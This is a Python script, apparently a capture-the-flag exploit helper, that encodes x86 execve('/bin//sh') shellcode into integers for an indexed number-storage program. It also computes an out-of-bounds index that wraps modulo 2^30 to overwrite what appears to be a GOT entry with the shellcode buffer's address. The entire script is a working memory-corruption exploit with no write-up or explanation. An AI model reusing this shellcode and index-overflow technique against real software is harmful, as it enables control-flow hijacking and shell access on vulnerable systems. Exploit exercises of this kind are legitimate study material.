import struct

payload_bytes = "b8e0a004 0831c951 682f2f73 68909090 682f6269 6e909090 89e331c9 31d29090 31c0b00b cd809090"

num = payload_bytes.split(" ")

out_bytes = []

i = 0
j = 0

while i < len(num):
    if j % 3 == 0:
        j += 1
        continue
    splitted = [num[i][k : k + 2] for k in range(0, len(num[i]), 2)][::-1]
    out_bytes.append((j, "".join(splitted), int("".join(splitted), 16)))
    j += 1
    i += 1

for o in out_bytes:
    print(f"[{o[0]:>2}] = {o[2]:>10} ({o[1]})")

BUFFER_START = 0xFFFFDC54
TARGET_ADDR = 0x804A00C
INDEX = 33632494

print("\n\n\n")
print("TRIGGER:")

print(f"[{INDEX}] = {BUFFER_START + 4}")
print(f"How to get this ? go to https://www.wolframalpha.com/input?i={BUFFER_START >> 2}+%2B+x+%3D%3D+{TARGET_ADDR >> 2}+Mod[2^30]")
